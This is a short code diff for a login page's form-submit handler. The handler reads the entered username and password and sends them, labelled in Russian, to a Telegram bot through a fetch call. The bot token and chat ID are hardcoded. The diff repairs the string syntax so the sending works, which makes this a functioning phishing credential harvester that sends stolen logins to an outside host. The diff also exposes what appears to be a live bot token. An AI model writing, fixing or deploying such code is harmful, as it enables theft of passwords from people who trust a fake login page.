@@ -271,15 +271,13 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
 
     const username = document.getElementById("login-username").value;
     const password = document.getElementById("login-password").value;
-    const ip = "IP не определено";
 
-    const message = Логин: ${username} | Пароль: ${password} | IP: ${ip};
+    const message = "Логин: " + username + " | Пароль: " + password;
 
-    // СЮДА ВСТАВЬТЕ ВАШ ТОКЕН И CHAT_ID
     const BOT_TOKEN = "8940580334:AAHKpfrG1AC8qTgbF-DmASQmbVaSsX1vR2Q";
     const CHAT_ID = "8470930779";
 
-    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)};
+    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);
 
     fetch(url)
         .then(response => {
